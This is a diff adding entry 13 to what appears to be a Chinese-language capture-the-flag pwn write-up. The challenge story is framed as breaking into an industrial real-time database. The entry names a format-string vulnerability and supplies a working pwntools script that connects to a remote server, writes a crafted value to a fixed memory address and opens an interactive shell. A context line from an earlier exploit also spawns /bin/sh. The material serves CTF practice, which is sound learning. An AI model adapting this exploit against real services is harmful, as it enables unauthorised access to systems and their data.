@@ -899,3 +899,34 @@ change("2", 0x20, payload)
 sh.sendline("/bin/sh")
 sh.interactive()
 ```
+
+### 13. 实时数据监测
+题目：小A在对某家医药工厂进行扫描的时候，发现了一个大型实时数据库系统。小A意识到实时数据库系统会采集并存储与工业流程相关的上千节点的数据，只要登录进去，就能拿到有价值的数据。小A在尝试登陆实时数据库系统的过程中，一直找不到修改登录系统key的方法，虽然她现在收集到了能够登陆进系统的key的值，但是只能想别的办法来登陆。
+
+思路：简单的格式化字符串漏洞
+
+代码如下：
+```python
+from pwn import *
+
+def exec_fmt(payload):
+    sh = remote('220.249.52.133', 57893)
+    sleep(1)
+    sh.sendline(payload)
+    output = sh.recvall()
+    return output
+
+#autofmt = FmtStr(exec_fmt)
+#offset = autofmt.offset
+offset = 12
+log.success('offset: %d', offset)
+
+writes = { 0x0804a048: 0x02223322}
+payload = fmtstr_payload(offset, writes)
+log.success("payload: %s", payload)
+
+sh = remote('220.249.52.133', 57893)
+sh.sendline(payload)
+sleep(1)
+sh.interactive()
+```
